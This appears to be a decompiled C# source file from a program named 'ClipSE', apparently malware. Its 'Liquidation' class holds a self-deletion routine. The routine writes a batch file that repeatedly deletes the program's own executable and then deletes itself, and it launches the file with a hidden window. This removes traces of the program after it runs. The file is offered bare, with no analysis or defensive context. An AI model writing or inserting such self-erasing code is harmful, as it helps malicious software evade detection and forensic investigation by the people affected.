using System;
using System.Diagnostics;
using System.IO;

namespace ClipSE
{
	// Token: 0x02000006 RID: 6
	public static class Liquidation
	{
		// Token: 0x06000008 RID: 8 RVA: 0x00002450 File Offset: 0x00000650
		public static void Inizialize(string pathfile)
		{
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(pathfile))
				{
					streamWriter.WriteLine("@echo off");
					streamWriter.WriteLine(":loop");
					streamWriter.WriteLine("del \"" + GlobalPath.GetFileName + "\"");
					streamWriter.WriteLine("if Exist \"" + GlobalPath.GetFileName + "\" GOTO loop");
					streamWriter.WriteLine("del %0");
					streamWriter.Flush();
				}
			}
			catch (Exception ex)
			{
				File.WriteAllText("Self_Error.txt", ex.Message);
			}
			if (File.Exists(pathfile))
			{
				ProcessControl.RunFile(pathfile);
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x0000250C File Offset: 0x0000070C
		public static void SelfDelete(string pathfile, string args)
		{
			ProcessWindowStyle windowStyle = ProcessWindowStyle.Hidden;
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				Arguments = args,
				FileName = pathfile,
				CreateNoWindow = false,
				WindowStyle = windowStyle
			};
			using (Process process = Process.Start(startInfo))
			{
				process.Refresh();
			}
		}
	}
}
